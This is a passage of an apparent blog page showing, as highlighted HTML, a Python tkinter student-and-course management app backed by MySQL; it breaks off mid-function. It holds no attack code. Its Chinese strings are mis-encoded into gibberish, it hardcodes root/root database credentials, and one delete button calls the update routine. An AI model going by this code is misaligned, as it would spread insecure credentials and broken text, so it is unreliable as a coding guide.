class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox, PhotoImage, Label, Canvas, Frame</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»çª—å£</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainApplication</span>(tk.Tk):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.geometry(<span class="string">&quot;700x650+99+50&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.title(<span class="string">&quot;å­¦ç”Ÿç®¡ç†ç³»ç»Ÿ v1.1.0&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è‡ªåŠ¨è¿æ¥æ•°æ®åº“</span></span><br><span class="line">        <span class="variable language_">self</span>.connection = <span class="variable language_">self</span>.connect_to_database()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># èƒŒæ™¯å›¾è®¾ç½®ï¼Œä½¿ç”¨Canvasé“ºæ»¡çª—å£</span></span><br><span class="line">        bg_image = PhotoImage(file=<span class="string">&quot;bg_image.png&quot;</span>)</span><br><span class="line">        canvas = Canvas(<span class="variable language_">self</span>, width=<span class="number">700</span>, height=<span class="number">650</span>)</span><br><span class="line">        canvas.pack(fill=<span class="string">&quot;both&quot;</span>, expand=<span class="literal">True</span>)</span><br><span class="line">        canvas.create_image(<span class="number">0</span>, <span class="number">0</span>, image=bg_image, anchor=<span class="string">&quot;nw&quot;</span>)</span><br><span class="line">        canvas.image = bg_image  <span class="comment"># ä¿æŒå¼•ç”¨ï¼Œé˜²æ­¢å›¾ç‰‡è¢«å›æ”¶</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># åˆ›å»ºæŒ‰é’®æ¡†æ¶</span></span><br><span class="line">        frame = tk.Frame(canvas, bg=<span class="string">&#x27;lightblue&#x27;</span>, bd=<span class="number">2</span>, relief=tk.SUNKEN)</span><br><span class="line">        canvas.create_window(<span class="number">350</span>, <span class="number">325</span>, window=frame)  <span class="comment"># ä½¿ç”¨canvasçª—å£</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä¸»ç•Œé¢æŒ‰é’®</span></span><br><span class="line">        word_list = [<span class="string">&quot;ç»´æŠ¤å­¦ç”Ÿä¿¡æ¯&quot;</span>, <span class="string">&quot;ç»´æŠ¤è¯¾ç¨‹ä¿¡æ¯&quot;</span>, <span class="string">&quot;ç»´æŠ¤å­¦ç”Ÿæˆç»©&quot;</span>, <span class="string">&quot;ç»Ÿè®¡å­¦ç”Ÿæˆç»©&quot;</span>, <span class="string">&quot;å­¦ç”Ÿæˆç»©æ’å&quot;</span>, <span class="string">&quot;æŸ¥è¯¢å­¦ç”Ÿä¿¡æ¯&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> i, word <span class="keyword">in</span> <span class="built_in">enumerate</span>(word_list):</span><br><span class="line">            button = tk.Button(</span><br><span class="line">                frame, text=word, bg=<span class="string">&#x27;SlateGray&#x27;</span>, fg=<span class="string">&#x27;AliceBlue&#x27;</span>, bd=<span class="number">5</span>,</span><br><span class="line">                command=<span class="keyword">lambda</span> i=i: <span class="variable language_">self</span>.show_sub_window(i), width=<span class="number">20</span>, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="number">12</span>),</span><br><span class="line">                activeforeground=<span class="string">&quot;pink&quot;</span>, activebackground=<span class="string">&quot;LavenderBlush&quot;</span></span><br><span class="line">            )</span><br><span class="line">            button.grid(row=i, column=<span class="number">0</span>, pady=<span class="number">10</span>, padx=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">connect_to_database</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;åˆ›å»ºæ•°æ®åº“è¿æ¥&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            connection = pymysql.connect(</span><br><span class="line">                host=<span class="string">&#x27;localhost&#x27;</span>, user=<span class="string">&#x27;root&#x27;</span>, password=<span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">                database=<span class="string">&#x27;s_t_u202312315&#x27;</span>, charset=<span class="string">&#x27;utf8mb4&#x27;</span>, autocommit=<span class="literal">True</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">return</span> connection</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;è¿æ¥å¤±è´¥&quot;</span>, <span class="string">f&quot;æ•°æ®åº“è¿æ¥é”™è¯¯: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.destroy()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_sub_window</span>(<span class="params">self, button_id</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æ‰“å¼€å­çª—å£&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> button_id == <span class="number">0</span>:</span><br><span class="line">            SubWindow1(<span class="variable language_">self</span>, <span class="variable language_">self</span>.connection)</span><br><span class="line">        <span class="keyword">elif</span> button_id == <span class="number">1</span>:</span><br><span class="line">            SubWindow2(<span class="variable language_">self</span>, <span class="variable language_">self</span>.connection)</span><br><span class="line">        <span class="keyword">elif</span> button_id == <span class="number">2</span>:</span><br><span class="line">            SubWindow3(<span class="variable language_">self</span>, <span class="variable language_">self</span>.connection)</span><br><span class="line">        <span class="keyword">elif</span> button_id == <span class="number">3</span>:</span><br><span class="line">            SubWindow4(<span class="variable language_">self</span>, <span class="variable language_">self</span>.connection)</span><br><span class="line">        <span class="keyword">elif</span> button_id == <span class="number">4</span>:</span><br><span class="line">            SubWindow5(<span class="variable language_">self</span>, <span class="variable language_">self</span>.connection)</span><br><span class="line">        <span class="keyword">elif</span> button_id == <span class="number">5</span>:</span><br><span class="line">            SubWindow6(<span class="variable language_">self</span>, <span class="variable language_">self</span>.connection)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å­çª—å£ç¤ºä¾‹</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubWindow1</span>(tk.Toplevel):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, master, connection</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(master)</span><br><span class="line">        <span class="variable language_">self</span>.title(<span class="string">&quot;ç»´æŠ¤å­¦ç”Ÿä¿¡æ¯&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.geometry(<span class="string">&quot;450x635+900+50&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.connection = connection</span><br><span class="line"></span><br><span class="line">        <span class="comment"># èƒŒæ™¯å›¾è®¾ç½®ï¼Œä½¿ç”¨Labelé“ºæ»¡çª—å£</span></span><br><span class="line">        bg_image = PhotoImage(file=<span class="string">&quot;bg_image.png&quot;</span>)</span><br><span class="line">        background_label = Label(<span class="variable language_">self</span>, image=bg_image)</span><br><span class="line">        background_label.place(relwidth=<span class="number">1</span>, relheight=<span class="number">1</span>)</span><br><span class="line">        background_label.image = bg_image  <span class="comment"># ä¿å­˜å¼•ç”¨ä»¥é˜²å›¾ç‰‡è¢«å›æ”¶</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¾“å…¥å­—æ®µå’Œæ ‡ç­¾çš„æ¡†æ¶</span></span><br><span class="line">        input_frame = Frame(<span class="variable language_">self</span>, bg=<span class="string">&quot;#ffffff&quot;</span>)  <span class="comment"># ä½¿ç”¨é€æ˜èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">        input_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.4</span>, anchor=<span class="string">&quot;center&quot;</span>)  <span class="comment"># ä¸­å¿ƒå¯¹é½</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># å­—æ®µåå’Œè¾“å…¥æ¡†å¹¶åˆ—æ˜¾ç¤º</span></span><br><span class="line">        fields = [<span class="string">&quot;å­¦å·:&quot;</span>, <span class="string">&quot;å§“å:&quot;</span>, <span class="string">&quot;æ€§åˆ«:&quot;</span>, <span class="string">&quot;å¹´é¾„:&quot;</span>, <span class="string">&quot;ç³»:&quot;</span>, <span class="string">&quot;å¥–å­¦é‡‘:&quot;</span>]</span><br><span class="line">        <span class="variable language_">self</span>.entries = []</span><br><span class="line">        <span class="keyword">for</span> i, field <span class="keyword">in</span> <span class="built_in">enumerate</span>(fields):</span><br><span class="line">            label = tk.Label(input_frame, text=field, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bg=<span class="string">&#x27;white&#x27;</span>, fg=<span class="string">&#x27;Black&#x27;</span>)</span><br><span class="line">            label.grid(row=i, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">15</span>, sticky=<span class="string">&quot;e&quot;</span>)  <span class="comment"># è®¾ç½®è¾ƒå¤§çš„ pady å€¼</span></span><br><span class="line">            entry = tk.Entry(input_frame, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bd=<span class="number">3</span>, bg=<span class="string">&#x27;lightyellow&#x27;</span>, fg=<span class="string">&#x27;Black&#x27;</span>, width=<span class="number">25</span>)</span><br><span class="line">            entry.grid(row=i, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">15</span>, sticky=<span class="string">&quot;w&quot;</span>)  <span class="comment"># è®¾ç½®è¾ƒå¤§çš„ pady å€¼</span></span><br><span class="line">            <span class="variable language_">self</span>.entries.append(entry)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ’å…¥å’Œæ›´æ–°æŒ‰é’®å¹¶åˆ—æ’å¸ƒ</span></span><br><span class="line">        button_frame = Frame(<span class="variable language_">self</span>, bg=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">        button_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.85</span>, anchor=<span class="string">&quot;center&quot;</span>)  <span class="comment"># æŒ‰é’®æ¡†æ¶ä½ç½®</span></span><br><span class="line"></span><br><span class="line">        insert_button = tk.Button(</span><br><span class="line">            button_frame, text=<span class="string">&quot;ç¡®è®¤æ·»åŠ &quot;</span>, command=<span class="variable language_">self</span>.insert_student_table, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;14&#x27;</span>),</span><br><span class="line">            bg=<span class="string">&#x27;lightblue&#x27;</span>, fg=<span class="string">&#x27;White&#x27;</span>, bd=<span class="number">6</span>, activeforeground=<span class="string">&quot;SpringGreen&quot;</span>, activebackground=<span class="string">&quot;Wheat&quot;</span></span><br><span class="line">        )</span><br><span class="line">        insert_button.grid(row=<span class="number">0</span>, column=<span class="number">0</span>, padx=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">        update_button = tk.Button(</span><br><span class="line">            button_frame, text=<span class="string">&quot;ç¡®è®¤ä¿®æ”¹&quot;</span>, command=<span class="variable language_">self</span>.update_student_table, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;14&#x27;</span>),</span><br><span class="line">            bg=<span class="string">&#x27;lightblue&#x27;</span>, fg=<span class="string">&#x27;White&#x27;</span>, bd=<span class="number">6</span>, activeforeground=<span class="string">&quot;SpringGreen&quot;</span>, activebackground=<span class="string">&quot;Wheat&quot;</span></span><br><span class="line">        )</span><br><span class="line">        update_button.grid(row=<span class="number">0</span>, column=<span class="number">1</span>, padx=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insert_student_table</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æ–°å¢å­¦ç”Ÿä¿¡æ¯çš„é€»è¾‘&quot;&quot;&quot;</span></span><br><span class="line">        new_sno = <span class="variable language_">self</span>.entries[<span class="number">0</span>].get()</span><br><span class="line">        new_sname = <span class="variable language_">self</span>.entries[<span class="number">1</span>].get()</span><br><span class="line">        new_ssex = <span class="variable language_">self</span>.entries[<span class="number">2</span>].get()</span><br><span class="line">        new_sage = <span class="variable language_">self</span>.entries[<span class="number">3</span>].get()</span><br><span class="line">        new_sdept = <span class="variable language_">self</span>.entries[<span class="number">4</span>].get()</span><br><span class="line">        new_scholarship = <span class="variable language_">self</span>.entries[<span class="number">5</span>].get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                sql = (<span class="string">&quot;INSERT INTO student(sno, sname, ssex, sage, sdept, scholarship) &quot;</span></span><br><span class="line">                       <span class="string">&quot;values (%s, %s, %s, %s, %s, %s);&quot;</span>)</span><br><span class="line">                cursor.execute(sql, (new_sno, new_sname, new_ssex, <span class="built_in">int</span>(new_sage), new_sdept, new_scholarship))</span><br><span class="line">            messagebox.showinfo(<span class="string">&quot;æˆåŠŸ&quot;</span>, <span class="string">f&quot;å·²åŠ å…¥æ–°ç”Ÿ<span class="subst">&#123;new_sno&#125;</span>ä¿¡æ¯ï¼&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span class="string">f&quot;æ–°å¢å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update_student_table</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æ›´æ–°å­¦ç”Ÿä¿¡æ¯çš„é€»è¾‘&quot;&quot;&quot;</span></span><br><span class="line">        new_sno = <span class="variable language_">self</span>.entries[<span class="number">0</span>].get()</span><br><span class="line">        new_sname = <span class="variable language_">self</span>.entries[<span class="number">1</span>].get()</span><br><span class="line">        new_ssex = <span class="variable language_">self</span>.entries[<span class="number">2</span>].get()</span><br><span class="line">        new_sage = <span class="variable language_">self</span>.entries[<span class="number">3</span>].get()</span><br><span class="line">        new_sdept = <span class="variable language_">self</span>.entries[<span class="number">4</span>].get()</span><br><span class="line">        new_scholarship = <span class="variable language_">self</span>.entries[<span class="number">5</span>].get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                sql = (<span class="string">&quot;UPDATE student SET sname=%s, ssex=%s, sage=%s, sdept=%s, scholarship=%s WHERE sno=%s;&quot;</span>)</span><br><span class="line">                cursor.execute(sql, (new_sname, new_ssex, <span class="built_in">int</span>(new_sage), new_sdept, new_scholarship, new_sno))</span><br><span class="line">            messagebox.showinfo(<span class="string">&quot;æˆåŠŸ&quot;</span>, <span class="string">f&quot;å·²æ›´æ–°å­¦ç”Ÿ<span class="subst">&#123;new_sno&#125;</span>ä¿¡æ¯ï¼&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span class="string">f&quot;æ›´æ–°å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å­çª—å£2ï¼šè¯¾ç¨‹ä¿¡æ¯ç»´æŠ¤</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubWindow2</span>(tk.Toplevel):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, master, connection</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(master)</span><br><span class="line">        <span class="variable language_">self</span>.title(<span class="string">&quot;ç»´æŠ¤è¯¾ç¨‹ä¿¡æ¯&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.geometry(<span class="string">&quot;450x635+900+50&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.connection = connection</span><br><span class="line"></span><br><span class="line">        <span class="comment"># èƒŒæ™¯å›¾è®¾ç½®</span></span><br><span class="line">        bg_image = PhotoImage(file=<span class="string">&quot;bg_image.png&quot;</span>)</span><br><span class="line">        background_label = Label(<span class="variable language_">self</span>, image=bg_image)</span><br><span class="line">        background_label.place(relwidth=<span class="number">1</span>, relheight=<span class="number">1</span>)</span><br><span class="line">        background_label.image = bg_image  <span class="comment"># ä¿æŒå¼•ç”¨ä»¥é˜²å›¾ç‰‡è¢«å›æ”¶</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¾“å…¥å­—æ®µå’Œæ ‡ç­¾æ¡†æ¶</span></span><br><span class="line">        input_frame = Frame(<span class="variable language_">self</span>, bg=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">        input_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.4</span>, anchor=<span class="string">&quot;center&quot;</span>)  <span class="comment"># å±…ä¸­æ”¾ç½®</span></span><br><span class="line"></span><br><span class="line">        fields = [<span class="string">&quot;è¯¾ç¨‹å·:&quot;</span>, <span class="string">&quot;è¯¾ç¨‹å:&quot;</span>, <span class="string">&quot;å…ˆè¡Œè¯¾:&quot;</span>, <span class="string">&quot;å­¦åˆ†:&quot;</span>]</span><br><span class="line">        <span class="variable language_">self</span>.entries = []</span><br><span class="line">        <span class="keyword">for</span> i, field <span class="keyword">in</span> <span class="built_in">enumerate</span>(fields):</span><br><span class="line">            label = tk.Label(input_frame, text=field, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bg=<span class="string">&#x27;white&#x27;</span>, fg=<span class="string">&#x27;Black&#x27;</span>)</span><br><span class="line">            label.grid(row=i, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">15</span>, sticky=<span class="string">&quot;e&quot;</span>)  <span class="comment"># æ ‡ç­¾åœ¨æ¡†æ¶å†…å³å¯¹é½</span></span><br><span class="line">            entry = tk.Entry(input_frame, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bd=<span class="number">3</span>, bg=<span class="string">&#x27;lightyellow&#x27;</span>, fg=<span class="string">&#x27;Black&#x27;</span>, width=<span class="number">25</span>)</span><br><span class="line">            entry.grid(row=i, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">15</span>, sticky=<span class="string">&quot;w&quot;</span>)  <span class="comment"># è¾“å…¥æ¡†åœ¨æ¡†æ¶å†…å·¦å¯¹é½</span></span><br><span class="line">            <span class="variable language_">self</span>.entries.append(entry)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ’å…¥å’Œæ›´æ–°æŒ‰é’®å¹¶åˆ—æ’å¸ƒ</span></span><br><span class="line">        button_frame = Frame(<span class="variable language_">self</span>, bg=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">        button_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.85</span>, anchor=<span class="string">&quot;center&quot;</span>)  <span class="comment"># æŒ‰é’®æ¡†æ¶ä½ç½®</span></span><br><span class="line"></span><br><span class="line">        insert_button = tk.Button(</span><br><span class="line">            button_frame, text=<span class="string">&quot;ç¡®è®¤æ·»åŠ &quot;</span>, command=<span class="variable language_">self</span>.insert_course, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;14&#x27;</span>),</span><br><span class="line">            bg=<span class="string">&#x27;lightblue&#x27;</span>, fg=<span class="string">&#x27;White&#x27;</span>, bd=<span class="number">6</span>, activeforeground=<span class="string">&quot;SpringGreen&quot;</span>, activebackground=<span class="string">&quot;Wheat&quot;</span></span><br><span class="line">        )</span><br><span class="line">        insert_button.grid(row=<span class="number">0</span>, column=<span class="number">0</span>, padx=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">        update_button = tk.Button(</span><br><span class="line">            button_frame, text=<span class="string">&quot;ç¡®è®¤ä¿®æ”¹&quot;</span>, command=<span class="variable language_">self</span>.update_course, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;14&#x27;</span>),</span><br><span class="line">            bg=<span class="string">&#x27;lightblue&#x27;</span>, fg=<span class="string">&#x27;White&#x27;</span>, bd=<span class="number">6</span>, activeforeground=<span class="string">&quot;SpringGreen&quot;</span>, activebackground=<span class="string">&quot;Wheat&quot;</span></span><br><span class="line">        )</span><br><span class="line">        update_button.grid(row=<span class="number">0</span>, column=<span class="number">1</span>, padx=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">        delete_button = tk.Button(</span><br><span class="line">            button_frame, text=<span class="string">&quot;ç¡®è®¤åˆ é™¤&quot;</span>, command=<span class="variable language_">self</span>.update_course, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;14&#x27;</span>),</span><br><span class="line">            bg=<span class="string">&#x27;lightblue&#x27;</span>, fg=<span class="string">&#x27;White&#x27;</span>, bd=<span class="number">6</span>, activeforeground=<span class="string">&quot;SpringGreen&quot;</span>, activebackground=<span class="string">&quot;Wheat&quot;</span></span><br><span class="line">        )</span><br><span class="line">        delete_button.grid(row=<span class="number">0</span>, column=<span class="number">2</span>, padx=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">        tk.Button(button_frame, text=<span class="string">&quot;ç¡®è®¤æ·»åŠ &quot;</span>, command=<span class="variable language_">self</span>.insert_course, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;14&#x27;</span>)).grid(row=<span class="number">0</span>, column=<span class="number">0</span>, padx=<span class="number">10</span>)</span><br><span class="line">        tk.Button(button_frame, text=<span class="string">&quot;ç¡®è®¤ä¿®æ”¹&quot;</span>, command=<span class="variable language_">self</span>.update_course, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;14&#x27;</span>)).grid(row=<span class="number">0</span>, column=<span class="number">1</span>, padx=<span class="number">10</span>)</span><br><span class="line">        tk.Button(button_frame, text=<span class="string">&quot;ç¡®è®¤åˆ é™¤&quot;</span>, command=<span class="variable language_">self</span>.delete_course, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;14&#x27;</span>)).grid(row=<span class="number">0</span>, column=<span class="number">2</span>, padx=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">insert_course</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æ–°å¢è¯¾ç¨‹ä¿¡æ¯&quot;&quot;&quot;</span></span><br><span class="line">        new_cno = <span class="variable language_">self</span>.entries[<span class="number">0</span>].get()</span><br><span class="line">        new_cname = <span class="variable language_">self</span>.entries[<span class="number">1</span>].get()</span><br><span class="line">        new_cpno = <span class="variable language_">self</span>.entries[<span class="number">2</span>].get()</span><br><span class="line">        new_credit = <span class="variable language_">self</span>.entries[<span class="number">3</span>].get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                sql = <span class="string">&quot;INSERT INTO course (cno, cname, cpno, ccredit) VALUES (%s, %s, %s, %s)&quot;</span></span><br><span class="line">                cursor.execute(sql, (new_cno, new_cname, new_cpno, <span class="built_in">int</span>(new_credit)))</span><br><span class="line">            messagebox.showinfo(<span class="string">&quot;æˆåŠŸ&quot;</span>, <span class="string">f&quot;å·²æˆåŠŸæ·»åŠ è¯¾ç¨‹ <span class="subst">&#123;new_cno&#125;</span> ä¿¡æ¯ï¼&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span class="string">f&quot;æ·»åŠ å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update_course</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æ›´æ–°è¯¾ç¨‹ä¿¡æ¯&quot;&quot;&quot;</span></span><br><span class="line">        new_cno = <span class="variable language_">self</span>.entries[<span class="number">0</span>].get()</span><br><span class="line">        new_cname = <span class="variable language_">self</span>.entries[<span class="number">1</span>].get()</span><br><span class="line">        new_cpno = <span class="variable language_">self</span>.entries[<span class="number">2</span>].get()</span><br><span class="line">        new_credit = <span class="variable language_">self</span>.entries[<span class="number">3</span>].get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                sql = <span class="string">&quot;UPDATE course SET cname=%s, cpno=%s, ccredit=%s WHERE cno=%s&quot;</span></span><br><span class="line">                cursor.execute(sql, (new_cname, new_cpno, <span class="built_in">int</span>(new_credit), new_cno))</span><br><span class="line">            messagebox.showinfo(<span class="string">&quot;æˆåŠŸ&quot;</span>, <span class="string">f&quot;å·²æ›´æ–°è¯¾ç¨‹ <span class="subst">&#123;new_cno&#125;</span> ä¿¡æ¯ï¼&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span 